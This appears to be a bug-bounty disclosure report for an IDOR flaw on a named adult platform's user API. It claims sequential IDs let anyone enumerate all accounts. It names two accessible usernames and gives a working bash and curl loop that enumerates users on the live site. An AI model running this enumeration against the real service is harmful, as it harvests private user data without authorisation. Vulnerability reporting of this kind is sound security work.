User Enumeration Evidence - IDOR Vulnerability
==============================================

This document demonstrates that user IDs are sequential and can be enumerated,
allowing access to ALL users on the platform.

Test Date: November 24, 2025
Tester: deoxyribose404
Endpoint: GET /api/front/users/{user_id}

User ID 100000:   Anasswins              ✅ Accessible
User ID 230247549: hethetdh              ✅ Accessible (test account)

Impact:
------
- User IDs are sequential (1, 2, 3, ...)
- An attacker can iterate through all user IDs
- Platform has 230+ million users
- ALL users can be enumerated and accessed
- Complete user database can be extracted

Proof of Concept:
---------------
Run the following command to enumerate users:

for id in {1..100}; do
  curl -s "https://stripchat.com/api/front/users/$id" \
    -H "Cookie: [SESSION_COOKIE]" \
    -H "HackerOne: deoxyribose404" \
    -H "Accept: application/json" | jq -r '.user.username // "Not found"'
done

This will enumerate users from ID 1 to 100. The same technique can be used
to enumerate all 230+ million users on the platform.
